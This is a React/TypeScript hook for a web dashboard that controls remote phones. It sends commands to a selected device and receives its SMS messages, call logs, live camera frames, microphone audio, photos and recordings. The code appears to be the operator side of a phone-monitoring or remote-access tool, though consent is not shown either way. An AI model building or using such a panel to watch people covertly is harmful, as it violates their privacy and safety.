import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { apiUrl, wsUrlForControl } from '../lib/helpers'
import type { Device, DeviceHealth, HealthResponse, WsState, SMS, Call, Photo, CameraFrame, Recording } from '../types/dashboard'

export type AudioDataCallback = (data: ArrayBuffer, deviceId: string) => void
export type WebRTCMessageCallback = (msg: Record<string, unknown>) => void
export type CameraFrameCallback = (frame: CameraFrame) => void

export function useDashboard(
  onAudioData?: AudioDataCallback,
  onWebRTCMessage?: WebRTCMessageCallback,
  onCameraFrame?: CameraFrameCallback
) {
  const [wsState, setWsState] = useState<WsState>('connecting')
  const [devices, setDevices] = useState<Device[]>([])
  const [selectedDeviceId, setSelectedDeviceId] = useState<string>('')
  const [serverHealth, setServerHealth] = useState<HealthResponse | null>(null)
  const [feed, setFeed] = useState<string[]>([])
  const [photos, setPhotos] = useState<Photo[]>([])
  const [recordings, setRecordings] = useState<Recording[]>([])
  const wsRef = useRef<WebSocket | null>(null)
  const reconnectTimerRef = useRef<number | null>(null)
  const pendingWsCommandsRef = useRef<Array<{ cmd: string; targetId: string; extra: Record<string, unknown> }>>([])

  const selectedDevice = useMemo(
    () => devices.find((device) => device.deviceId === selectedDeviceId) ?? null,
    [devices, selectedDeviceId],
  )

  const addFeed = useCallback((message: string) => {
    const stamped = `${new Date().toLocaleTimeString()}  ${message}`
    setFeed((prev) => [stamped, ...prev].slice(0, 80))
  }, [])

  const upsertDevice = useCallback((next: Partial<Device> & { deviceId: string }) => {
    setDevices((prev) => {
      const idx = prev.findIndex((item) => item.deviceId === next.deviceId)
      if (idx === -1) {
        return [next as Device, ...prev]
      }
      const clone = [...prev]
      clone[idx] = { 
        ...clone[idx], 
        ...next, 
        health: { ...clone[idx].health, ...next.health },
        sms: next.sms ?? clone[idx].sms,
        calls: next.calls ?? clone[idx].calls,
      }
      return clone
    })
  }, [])

  const removeDevice = useCallback((deviceId: string) => {
    setDevices((prev) => prev.filter((item) => item.deviceId !== deviceId))
    setSelectedDeviceId((prev) => (prev === deviceId ? '' : prev))
  }, [])

  const sendCommand = useCallback(
    async (cmd: string, extra: Record<string, unknown> = {}) => {
      const targetId = selectedDeviceId || devices[0]?.deviceId
      if (!targetId) {
        addFeed(`Cannot send ${cmd}: no target device`)
        return
      }
      addFeed(`Sending ${cmd}...`)

      // Primary path: send via control WebSocket so backend can apply
      // per-dashboard audio subscriptions (required for live stream audio routing).
      const ws = wsRef.current
      if (ws && ws.readyState === WebSocket.OPEN) {
        try {
          ws.send(JSON.stringify({ cmd, deviceId: targetId, ...extra }))
          addFeed(`Routed ${cmd} to ${targetId} via control_ws`)
          return
        } catch (err) {
          const message = err instanceof Error ? err.message : String(err)
          addFeed(`Control WS send failed for ${cmd}: ${message}; trying HTTP fallback...`)
        }
      }

      if (ws && ws.readyState === WebSocket.CONNECTING) {
        pendingWsCommandsRef.current.push({ cmd, targetId, extra })
        addFeed(`Queued ${cmd} for ${targetId} (control_ws connecting)`)
        return
      }

      try {
        const res = await fetch(apiUrl(`/api/devices/${encodeURIComponent(targetId)}/command`), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: cmd, ...extra })
        })
        const contentType = res.headers.get('content-type') || ''
        if (!contentType.includes('application/json')) {
          const bodyPreview = (await res.text()).replace(/\s+/g, ' ').slice(0, 120)
          throw new Error(
            `Unexpected API response (${res.status}): ${bodyPreview || 'empty body'}`,
          )
        }

        const result = (await res.json()) as {
          status?: string
          error?: string
          message?: string
        }

        if (!res.ok) {
          throw new Error(result.error || result.message || `HTTP ${res.status}`)
        }

        addFeed(`Routed ${cmd} to ${targetId} via ${result.status || 'ok'}`)
      } catch (err) {
        const message = err instanceof Error ? err.message : String(err)
        addFeed(`Failed to send ${cmd}: ${message}`)
      }
    },
    [addFeed, devices, selectedDeviceId],
  )

  const onAudioDataRef = useRef(onAudioData)
  const onWebRTCMessageRef = useRef(onWebRTCMessage)
  const onCameraFrameRef = useRef(onCameraFrame)

  useEffect(() => {
    onAudioDataRef.current = onAudioData
    onWebRTCMessageRef.current = onWebRTCMessage
    onCameraFrameRef.current = onCameraFrame
  }, [onAudioData, onWebRTCMessage, onCameraFrame])

  useEffect(() => {
    let stopped = false

    const connect = () => {
      setWsState('connecting')
      const url = wsUrlForControl()
      const ws = new WebSocket(url)
      wsRef.current = ws

      ws.binaryType = 'arraybuffer'
      
      ws.addEventListener('open', () => {
        setWsState('open')
        addFeed('Control WebSocket connected')

        if (pendingWsCommandsRef.current.length > 0) {
          const queued = pendingWsCommandsRef.current.splice(0)
          let flushed = 0
          for (const item of queued) {
            try {
              ws.send(JSON.stringify({ cmd: item.cmd, deviceId: item.targetId, ...item.extra }))
              flushed += 1
            } catch {
              pendingWsCommandsRef.current.push(item)
            }
          }
          if (flushed > 0) {
            addFeed(`Flushed ${flushed} queued command${flushed > 1 ? 's' : ''}`)
          }
        }
      })

      ws.addEventListener('message', (event) => {
        // Handle binary data
        if (event.data instanceof ArrayBuffer) {
          const view = new DataView(event.data)
          
          if (view.byteLength >= 4 && view.getUint8(0) === 0x43 && view.getUint8(1) === 0x4C) { // 'CL'
            const headerLen = view.getUint16(2, false)
            if (view.byteLength >= 4 + headerLen) {
              const headerBytes = new Uint8Array(event.data, 4, headerLen)
              const headerJson = new TextDecoder().decode(headerBytes)
              try {
                const header = JSON.parse(headerJson) as Record<string, unknown>
                const jpegBytes = new Uint8Array(event.data, 4 + headerLen)
                const blob = new Blob([jpegBytes], { type: String(header.mime || 'image/jpeg') })
                const url = URL.createObjectURL(blob)
                
                if (onCameraFrameRef.current) {
                  onCameraFrameRef.current({
                    deviceId: String(header.deviceId || ''),
                    camera: header.camera === 'front' ? 'front' : 'rear',
                    quality: String(header.quality || 'normal'),
                    mime: String(header.mime || 'image/jpeg'),
                    data: '', 
                    url: url,
                    timestamp: Number(header.ts || Date.now()),
                  })
                }
              } catch (e) {
                console.error('Failed to parse binary camera frame:', e)
              }
            }
            return
          }

          if (onAudioDataRef.current && event.data.byteLength > 4) {
            // Extract device ID from frame header
            const deviceIdLen = view.getUint16(0, false)
            if (event.data.byteLength >= 2 + deviceIdLen) {
              const deviceIdBytes = new Uint8Array(event.data, 2, deviceIdLen)
              const deviceId = new TextDecoder().decode(deviceIdBytes)
              onAudioDataRef.current(event.data, deviceId)
            }
          }
          return
        }

        if (typeof event.data !== 'string') {
          return
        }

        try {
          const msg = JSON.parse(event.data) as Record<string, unknown>
          const type = String(msg.type || '')

          if (type === 'device_list' && Array.isArray(msg.devices)) {
            const list = msg.devices as Device[]
            setDevices(list)
            if (list[0]?.deviceId) {
              setSelectedDeviceId((prev) => prev || list[0].deviceId)
            }
            addFeed(`Loaded device list (${list.length})`)
            return
          }

          if (type === 'device_connected') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            upsertDevice({
              deviceId,
              model: String(msg.model || 'Unknown'),
              health: (msg.health as DeviceHealth | undefined) || {},
            })
            setSelectedDeviceId((prev) => prev || deviceId)
            addFeed(`Device connected: ${deviceId}`)
            return
          }

          if (type === 'device_info') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            upsertDevice({
              deviceId,
              model: String(msg.model || 'Unknown'),
              sdk: Number(msg.sdk || 0),
              appVersionName: String(msg.appVersionName || ''),
              appVersionCode: Number(msg.appVersionCode || 0),
            })
            return
          }

          if (type === 'device_health') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            upsertDevice({
              deviceId,
              health: (msg.health as DeviceHealth | undefined) || {},
            })
            return
          }

          if (type === 'device_disconnected') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            removeDevice(deviceId)
            addFeed(`Device disconnected: ${deviceId}`)
            return
          }

          // Handle device data (SMS, calls)
          if (type === 'device_data') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            const data = msg.data as Record<string, unknown> | undefined
            if (!data) return
            
            // Parse SMS messages
            const rawSms = data.sms as Array<Record<string, unknown>> | undefined
            const sms: SMS[] = (rawSms || []).map((s, i) => ({
              id: String(s.id || i),
              sender: String(s.address || 'Unknown'),
              body: String(s.body || ''),
              timestamp: new Date(Number(s.date || Date.now())).toISOString(),
              type: s.type === 'inbox' ? 'inbox' : s.type === 'sent' ? 'sent' : s.type === 'draft' ? 'draft' : 'other',
              read: Boolean(s.read),
            }))

            // Parse call log
            const rawCalls = data.callLog as Array<Record<string, unknown>> | undefined
            const calls: Call[] = (rawCalls || []).map((c, i) => ({
              id: String(c.id || i),
              number: String(c.number || 'Unknown'),
              name: c.name ? String(c.name) : undefined,
              type: c.type === 'incoming' ? 'incoming' : c.type === 'outgoing' ? 'outgoing' : c.type === 'missed' ? 'missed' : c.type === 'rejected' ? 'rejected' : 'other',
              duration: c.duration ? Number(c.duration) : undefined,
              timestamp: new Date(Number(c.date || Date.now())).toISOString(),
            }))

            upsertDevice({ deviceId, sms, calls })
            addFeed(`Device data received: ${sms.length} SMS, ${calls.length} calls`)
            return
          }

          // Handle photo saved
          if (type === 'photo_saved') {
            const photo: Photo = {
              id: String(msg.filename || Date.now()),
              filename: String(msg.filename || ''),
              url: apiUrl(String(msg.url || '')),
              camera: msg.camera === 'front' ? 'front' : 'rear',
              quality: msg.quality === 'fast' ? 'fast' : msg.quality === 'hd' ? 'hd' : 'normal',
              aiEnhanced: Boolean(msg.aiEnhanced),
              size: Number(msg.size || 0),
              timestamp: new Date(Number(msg.ts || Date.now())).toISOString(),
            }
            setPhotos(prev => [photo, ...prev].slice(0, 50))
            addFeed(`Photo saved: ${photo.filename}`)
            return
          }

          // Handle live camera frame
          if (type === 'camera_live_frame') {
            if (onCameraFrameRef.current) {
              const frame: CameraFrame = {
                deviceId: String(msg.deviceId || ''),
                camera: msg.camera === 'front' ? 'front' : 'rear',
                quality: String(msg.quality || 'normal'),
                mime: String(msg.mime || 'image/jpeg'),
                data: String(msg.data || ''),
                timestamp: Number(msg.ts || Date.now()),
              }
              onCameraFrameRef.current(frame)
            }
            return
          }

          // Handle recording saved
          if (type === 'recording_saved') {
            const recording: Recording = {
              id: String(msg.filename || Date.now()),
              filename: String(msg.filename || ''),
              duration: 0,
              size: 0,
              timestamp: new Date().toISOString(),
              url: apiUrl(`/recordings/${msg.filename}`),
            }
            setRecordings(prev => [recording, ...prev].slice(0, 50))
            addFeed(`Recording saved: ${recording.filename}`)
            return
          }

          // Handle command acknowledgments
          if (type === 'command_ack') {
            const cmd = String(msg.command || '')
            const status = String(msg.status || 'success')
            const detail = msg.detail ? ` - ${msg.detail}` : ''
            const prefix = msg.deviceId ? `${String(msg.deviceId).substring(0,8)}:` : ''
            addFeed(`📢 CMD ${prefix} ${cmd} (${status})${detail}`)
            return
          }
          if (type === 'ack') {
            const cmd = String(msg.message || '')
            const prefix = msg.deviceId ? `${String(msg.deviceId).substring(0,8)}:` : ''
            addFeed(`⚙️ ACK ${prefix} ${cmd}`)
            return
          }

          // Handle WebRTC signaling messages
          if (type === 'webrtc_answer' || type === 'webrtc_ice' || type === 'webrtc_state') {
            if (onWebRTCMessageRef.current) {
              onWebRTCMessageRef.current(msg)
            }
            addFeed(`Event: ${type}`)
            return
          }

          if (type === 'error') {
            addFeed(`Server error: ${String(msg.message || 'unknown')}`)
            return
          }

          if (type) {
            addFeed(`Event: ${type}`)
          }
        } catch {
          addFeed('Received non-JSON control message')
        }
      })

      ws.addEventListener('error', (event) => {
        addFeed('Control WebSocket error - browser blocked connection or backend down')
        console.error('WS Error:', event)
      })

      ws.addEventListener('close', () => {
        setWsState('closed')
        if (stopped) return
        addFeed('Control WebSocket disconnected, retrying...')
        reconnectTimerRef.current = window.setTimeout(connect, 3000)
      })
    }

    connect()

    return () => {
      stopped = true
      if (reconnectTimerRef.current) {
        clearTimeout(reconnectTimerRef.current)
      }
      wsRef.current?.close()
    }
  }, [addFeed, removeDevice, upsertDevice])

  useEffect(() => {
    let stopped = false

    const loadHealth = async () => {
      try {
        const res = await fetch(apiUrl('/health'))
        const json = (await res.json()) as HealthResponse
        if (!stopped) {
          setServerHealth(json)
        }
      } catch {
        if (!stopped) {
          setServerHealth(null)
        }
      }
    }

    loadHealth()
    const id = window.setInterval(loadHealth, 15000)

    return () => {
      stopped = true
      clearInterval(id)
    }
  }, [])

  useEffect(() => {
    if (selectedDeviceId) {
      return
    }
    if (devices[0]?.deviceId) {
      setSelectedDeviceId(devices[0].deviceId)
    }
  }, [devices, selectedDeviceId])

  return {
    wsState,
    devices,
    selectedDevice,
    selectedDeviceId,
    serverHealth,
    feed,
    photos,
    recordings,
    setSelectedDeviceId,
    sendCommand,
  }
}
